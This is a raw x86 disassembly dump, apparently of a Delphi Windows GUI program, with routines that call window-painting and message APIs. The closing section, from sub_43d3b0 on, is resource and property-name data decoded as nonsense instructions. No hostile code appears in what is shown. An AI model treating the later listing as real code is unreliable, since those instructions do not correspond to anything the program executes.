call sub_42ae24
cmp eax 0x1
sbb ebx ebx
inc ebx
sub_43c314
push ebx
add esp 0xfffffff0
mov ebx eax
mov [ ebx + 0x252 ] dl
cmp [ ebx + 0x269 ] 0x0
je r-xdata
add esp 0x10
pop ebx
retn
test dl dl
je r-xdata
mov eax ebx
call sub_453a88
mov ecx esp
mov edx 0x1
call sub_42ae08
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
mov eax ebx
call sub_43b6b4
jmp r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
sub_43c3d8
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov ebx eax
fld [ ebx + 0x210 ]
call sub_40293c
fabs
fstp [ ebp - 0xc ]
fwait
fld [ ebp + 0x8 ]
call sub_40293c
fabs
fld [ ebp - 0xc ]
fcompp
fnstsw ax
sahf
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn 0x8
push [ ebx + 0x214 ]
push [ ebx + 0x210 ]
lea eax [ ebp + 0x8 ]
call sub_409af4
fld [ ebp + 0x8 ]
fcomp [ r-xdata ]
fnstsw ax
sahf
jne r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax ebx
call sub_43b6b4
cmp [ ebx + 0x269 ] 0x0
jne r-xdata
mov [ ebx + 0x252 ] 0x0
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
jmp r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b920
call sub_40395c
sub_43c470
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x290 ]
mov edx esi
call sub_40432c
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x290 ]
mov edx esi
call sub_403f74
mov eax [ ebx + 0x290 ]
call sub_4043e0
push eax
push 0x0
push 0x1005
mov eax ebx
call sub_453a88
push eax
call SendMessageA
sub_43c5a8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43c617
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43c61e
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
mov eax rw-data
mov edx [ r-xdata ]
call sub_404950
mov eax rw-data
mov edx [ r-xdata ]
call sub_404950
mov eax [ rw-data ]
push eax
call FreeLibrary
sub_43c870
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
call sub_42cd5c
mov [ esi + 0x5 ] al
call sub_437d48
cmp eax 0x60000
setge al
mov [ esi + 0x4 ] al
mov eax esi
call sub_43d348
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034f4
mov eax esi
pop esi
pop ebx
retn
call sub_40354c
pop [ fs : 0x0 ]
add esp 0xc
sub_43c8bc
push ebx
push esi
call sub_40355c
mov ebx edx
mov esi eax
mov eax esi
call sub_43c95c
call sub_42cb9c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403180
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403544
sub_43c8f0
push ebx
push esi
push edi
mov ebx edx
mov esi eax
cmp [ esi + 0x6 ] 0x0
je r-xdata
xor eax eax
mov al bl
mov eax [ esi + eax * 4 + 0x8 ]
pop edi
pop esi
pop ebx
retn
xor eax eax
mov al bl
cmp [ esi + eax * 4 + 0x8 ] 0x0
jne r-xdata
mov edi ebx
and edi 0x7f
mov eax [ edi * 4 + rw-data ]
push eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ esi + edi * 4 + 0x8 ] eax
sub_43c95c
push ebx
push esi
push edi
mov esi eax
xor ebx ebx
inc ebx
cmp bl 0x18
jne r-xdata
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
xor eax eax
mov [ esi + edi * 4 + 0x8 ] eax
mov edi ebx
and edi 0x7f
mov eax [ esi + edi * 4 + 0x8 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
sub_43c9a0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c8f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43c9f0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c8f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43ca3c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c8f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_43ca80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi edx
mov ebx eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push esi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c8f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_43cac8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0x10 ]
cmp [ ebp + 0xc ] 0x0
je r-xdata
mov al 0x1
test eax eax
je r-xdata
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov ebx eax
mov eax [ ebx + 0x8 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
mov dl [ ebx ]
mov eax esi
call sub_43c8f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
cmp eax 0x1
sbb eax eax
inc eax
jmp r-xdata
test al al
je r-xdata
sub_43cb30
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov esi [ ebp + 0x10 ]
lea edi [ ebp - 0x1c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov esi ecx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov ebx eax
mov esi [ ebp + 0x14 ]
lea eax [ ebp - 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax esi
call sub_40476c
push eax
mov eax esi
call sub_40475c
push eax
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
push edi
mov dl [ ebp - 0xc ]
mov eax ebx
call sub_43c8f0
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_43cb94
mov [ ecx ] 0x0
xor eax eax
mov al dl
cmp eax 0xf
jge r-xdata
add eax 0xfffffff1
sub eax 0xc
jb r-xdata
add eax 0xfffffffe
sub eax 0x5
jb r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xf
jmp r-xdata
sub eax 0x2
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x8
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x4
mov eax 0x1b
jmp r-xdata
je r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x7
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0x1d
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43cc18
mov [ ecx ] 0x3
mov eax edx
add al 0xfe
sub al 0x7
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x9
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43cc54
mov [ ecx ] 0xe
mov eax edx
sub al 0x2
je r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
dec al
je r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
dec al
je r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43cca4
mov [ ecx ] 0x12
xor eax eax
mov al dl
cmp eax 0x14
jge r-xdata
add eax 0xffffffec
sub eax 0x6
jb r-xdata
add eax 0xfffffffe
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x14
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
sub eax 0x6
jb r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
mov [ ecx + 0x4 ] 0x5
mov eax 0x1a
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x8
jmp r-xdata
sub eax 0x6
jb r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x20
jmp r-xdata
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0xe
jmp r-xdata
jmp r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
sub_43cd40
mov [ ecx ] 0x14
xor eax eax
mov al dl
cmp eax 0x23
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43cd5d ]
jmp [ eax * 4 + jump_table_43cd81 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x3
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x4
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0x9
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x13
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x1d
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x22
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x23
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43ce50
mov [ ecx ] 0x17
xor eax eax
mov al dl
cmp eax 0x68
ja r-xdata
xor eax eax
mov [ ecx + 0x4 ] eax
xor eax eax
mov al [ eax + lookup_table_43ce6d ]
jmp [ eax * 4 + jump_table_43ced6 ]
mov [ ecx + 0x4 ] 0x1
mov eax 0x2
jmp r-xdata
mov [ ecx + 0x4 ] 0x2
mov eax 0x5
jmp r-xdata
mov [ ecx + 0x4 ] 0x3
mov eax 0x8
jmp r-xdata
mov [ ecx + 0x4 ] 0x4
mov eax 0xb
jmp r-xdata
mov [ ecx + 0x4 ] 0x5
mov eax 0xe
jmp r-xdata
mov [ ecx + 0x4 ] 0x6
mov eax 0x11
jmp r-xdata
mov [ ecx + 0x4 ] 0x7
mov eax 0x14
jmp r-xdata
mov [ ecx + 0x4 ] 0x8
mov eax 0x16
jmp r-xdata
mov [ ecx + 0x4 ] 0x9
mov eax 0x18
jmp r-xdata
mov [ ecx + 0x4 ] 0xa
mov eax 0x1a
jmp r-xdata
mov [ ecx + 0x4 ] 0xb
mov eax 0x1c
jmp r-xdata
mov [ ecx + 0x4 ] 0xc
mov eax 0x1e
jmp r-xdata
mov [ ecx + 0x4 ] 0xd
mov eax 0x20
jmp r-xdata
mov [ ecx + 0x4 ] 0xe
mov eax 0x24
jmp r-xdata
mov [ ecx + 0x4 ] 0xf
mov eax 0x28
jmp r-xdata
mov [ ecx + 0x4 ] 0x10
mov eax 0x2c
jmp r-xdata
mov [ ecx + 0x4 ] 0x11
mov eax 0x30
jmp r-xdata
mov [ ecx + 0x4 ] 0x12
mov eax 0x34
jmp r-xdata
mov [ ecx + 0x4 ] 0x13
mov eax 0x38
jmp r-xdata
mov [ ecx + 0x4 ] 0x14
mov eax 0x3c
jmp r-xdata
mov [ ecx + 0x4 ] 0x15
mov eax 0x40
jmp r-xdata
mov [ ecx + 0x4 ] 0x16
mov eax 0x44
jmp r-xdata
mov [ ecx + 0x4 ] 0x17
mov eax 0x48
jmp r-xdata
mov [ ecx + 0x4 ] 0x18
mov eax 0x4c
jmp r-xdata
mov [ ecx + 0x4 ] 0x19
mov eax 0x50
jmp r-xdata
mov [ ecx + 0x4 ] 0x1a
mov eax 0x54
jmp r-xdata
mov [ ecx + 0x4 ] 0x1b
mov eax 0x58
jmp r-xdata
mov [ ecx + 0x4 ] 0x1c
mov eax 0x5c
jmp r-xdata
mov [ ecx + 0x4 ] 0x1d
mov eax 0x60
jmp r-xdata
mov [ ecx + 0x4 ] 0x1e
mov eax 0x61
jmp r-xdata
mov [ ecx + 0x4 ] 0x1f
mov eax 0x62
jmp r-xdata
mov [ ecx + 0x4 ] 0x20
mov eax 0x63
jmp r-xdata
mov [ ecx + 0x4 ] 0x21
mov eax 0x64
jmp r-xdata
mov [ ecx + 0x4 ] 0x22
mov eax 0x65
jmp r-xdata
mov [ ecx + 0x4 ] 0x23
mov eax 0x66
jmp r-xdata
mov [ ecx + 0x4 ] 0x24
mov eax 0x67
jmp r-xdata
mov [ ecx + 0x4 ] 0x25
mov eax 0x68
jmp r-xdata
and edx 0x7f
sub edx eax
inc edx
mov [ ecx + 0x8 ] edx
retn
sub_43d1dc
push ebp
mov ebp esp
add esp 0xffffffbc
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
push 0xffffffec
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowLongA
test ah 0x2
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x28 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowRect
mov eax [ ebp - 0x24 ]
neg eax
push eax
mov eax [ ebp - 0x28 ]
neg eax
push eax
lea eax [ ebp - 0x28 ]
push eax
call OffsetRect
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowDC
mov [ ebp - 0x8 ] eax
xor edx edx
push ebp
push sub_43d337
push [ fs : edx ]
mov [ fs : edx ] esp
push esi
lea esi [ ebp - 0x28 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
test bl bl
je r-xdata
mov eax [ ebp - 0x1c ]
sub eax 0x2
push eax
mov eax [ ebp - 0x20 ]
sub eax 0x2
push eax
mov eax [ ebp - 0x24 ]
add eax 0x2
push eax
mov eax [ ebp - 0x28 ]
add eax 0x2
push eax
mov eax [ ebp - 0x8 ]
push eax
call ExcludeClipRect
lea ecx [ ebp - 0x34 ]
mov dl 0x2
mov eax esi
call sub_43cc18
lea eax [ ebp - 0x28 ]
push eax
push 0x0
lea ecx [ ebp - 0x34 ]
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_43ca3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call ReleaseDC
retn
push 0xfffffff0
mov eax [ ebp - 0x4 ]
call sub_453a88
push eax
call GetWindowLongA
test eax 0x100000
je r-xdata
test eax 0x200000
je r-xdata
push 0x2
call GetSystemMetrics
mov edi eax
push 0x3
call GetSystemMetrics
mov ebx eax
push 0xfffffffe
push 0xfffffffe
lea eax [ ebp - 0x18 ]
push eax
call InflateRect
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x44 ]
push eax
mov edx [ ebp - 0xc ]
sub edx ebx
mov eax [ ebp - 0x10 ]
sub eax edi
mov ecx [ ebp - 0x10 ]
call sub_416e34
push esi
lea esi [ ebp - 0x44 ]
lea edi [ ebp - 0x18 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0xf
call GetSysColorBrush
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call FillRect
sub_43d364
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_43d39f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_43d3a6
retn
mov eax [ rw-data ]
call sub_403190
mov eax rw-data
call sub_403f20
sub_43d3b0
cld
rol [ ebx ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
clc
aam 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al cl
aam 0x43
add dl ah
aam 0x43
add [ eax ] dl
add al [ eax ]
add [ esp + edx * 4 ] dl
inc esp
add ah al
push cs
inc edx
add ah ah
xor eax [ eax ]
sbb [ eax ] cl
inc edx
add ah ch
xor eax [ eax ]
add [ esi ] dl
inc ebp
add [ eax ] ch
xor [ eax ] eax
inc esp
xor [ eax ] eax
lodsb [ esi ]
push edi
inc ebp
add [ eax - 0x37ffbabb ] ah
or eax 0x8a840045
inc ecx
add [ eax - 0xe ] cl
inc esp
add [ esi + eax * 8 + 0x44 ] bl
add [ edx + edi * 8 + 0x44 ] bh
add [ edi + ecx * 8 + 0x44 ] dh
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + 0xe ] ah
inc esp
add [ eax + eax * 2 + 0x45d00045 ] dh
inc ebp
add [ eax * 2 - 0x3b2fffbb ] bl
inc esp
add [ eax ] dh
cmp eax [ ebp ]
push eax
cmp eax [ ebp ]
push 0x18004538
les eax [ eax + eax + 0x1c ]
les eax [ eax + eax + 0x18 ]
hlt
sub_43d452
inc esp
add [ esp + esi * 8 + 0x44 ] al
add [ edi + ecx * 8 + 0x44 ] bl
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax - 0x64 ] cl
adc al 0x45
add al cl
hlt
sub_43d5c6
inc esp
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + 0x10004413 ] ch
loope r-xdata
add al cl
hlt
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0x15c40044 ] dh
inc esp
add [ eax + 0x14 ] al
inc esp
add [ edi ] al
add [ edx ] dl
mov al 0xe
mov al 0x6
mov al 0x13
mov al 0x14
mov al 0xc7
inc esi
add al dl
les eax [ eax + eax + 0x14 ]
int3
sub_43d602
inc esp
add [ esp + esi * 8 + 0x44 ] al
add al cl
pop ss
inc esp
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0xc ] cl
in al 0x44
add al cl
hlt
sub_43d70a
inc esp
add ah bl
push cs
inc edx
add ah al
or eax [ edx ]
mov esp 0xe400420b
push cs
inc edx
add [ eax + 0x10004413 ] ch
loope r-xdata
add al cl
hlt
add [ ecx ] cl
inc esp
add ah bl
loope r-xdata
add ah dl
salc
inc esp
add [ eax - 0x39 ] cl
inc esp
add [ esi + edx * 8 + 0x15c40044 ] dh
inc esp
add [ eax + 0x14 ] al
inc esp
add [ esi ] al
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
nop
xlat
inc ebx
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
add al dl
les eax [ eax + eax + 0x14 ]
int3
sub_43d746
inc esp
add [ esp + esi * 8 + 0x44 ] al
add al cl
pop ss
inc esp
add [ ebp + eax * 8 - 0x2f17ffbc ] dl
inc esp
add [ eax - 0x30 ] ah
inc esp
add [ ebx + edx * 8 + 0x44 ] dh
add [ eax ] ah
rol [ eax + eax + 0xc ] cl
in al 0x44
add al cl
hlt
sub_43d799
salc
inc ebx
add [ esi + edx * 8 + 0x43 ] bh
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
add [ edi ] al
inc ecx
outsb
inc ebx
je r-xdata
add [ eax - 0x2d ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
jb r-xdata
add [ eax ] al
adc [ ecx ] 0x0
add eax 0x6f6c6f43
jg r-xdata
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add bh bh
lodsb [ esi ]
pop ss
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
dec esp
jg r-xdata
add [ eax + edi * 2 ] cl
inc esp
add [ ebx ] bl
add bh bh
mov al [ 0x10044c6 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
jb r-xdata
add [ eax + eax ] dh
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
jmp [ eax - 0xa ]
add [ eax ] al
add [ ecx + edx * 8 - 0x2e43ffbc ] cl
inc esp
add [ eax + 0x44f1 ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
add [ ecx ] ah
add bh bh
loopne r-xdata
pop ss
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x460c0017 ] al
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
outsd
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
inc eax
imul ebp [ esi + 0x74 ] 0x4477f473
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
fwait
imul ebp [ edi + 0x6e ] sub_421da8
jo r-xdata
add dh bh
mov al 0xd2
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xdc65646f
jle r-xdata
or eax [ eax ]
add eax 0x67696c41
outsb
mov eax 0x6c004155
add [ eax ] eax
[ edi + edx + 0x10044 ]
add [ eax ] al
arpl [ eax + 0x6f ] bp
jb r-xdata
inc esp
add [ ebp + eax * 8 + 0x44 ] bh
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
or eax 0x6e410700
inc eax
add [ ecx ] bl
add bh bh
mov eax 0x10044d2
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
outsd
insb
dec eax
and al [ edx ]
push 0x80ff0000
rol [ eax + eax - 0x70 ] cl
rol [ eax + eax ] cl
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
je r-xdata
jle r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
add bh bh
sub al 0xd3
inc esp
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
outsd
outsb
test al 0x1d
inc edx
add [ eax ] dh
adc [ eax ] al
push eax
add [ eax ] al
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
add [ ebx - 0x64010000 ] bl
push eax
jae r-xdata
adc [ eax ] al
in al 0x17
inc esp
add [ eax ] ah
sbb [ eax + eax - 0x78 ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x540b0020 ] al
jb r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add bh bh
jb r-xdata
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
outsb
jae r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0xff0000 0x44d3
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942dba5
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
push edi
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
lodsb [ esi ]
rol [ eax + eax + 0x8 ] 0x1
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x656c62
adc [ eax ] al
outsd
add [ eax ] eax
inc [ eax + 0x1004418 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
aad 0x43
add [ esi + 0x1 ] ch
add bh bh
sbb [ fs : eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
add [ eax ] al
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc esp
jb r-xdata
jo r-xdata
jb r-xdata
outsb
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx - 0x23010000 ] bl
rol [ eax + eax - 0x5c ] cl
rol [ eax + eax ] cl
add [ eax ] dl
push 0x6948776f
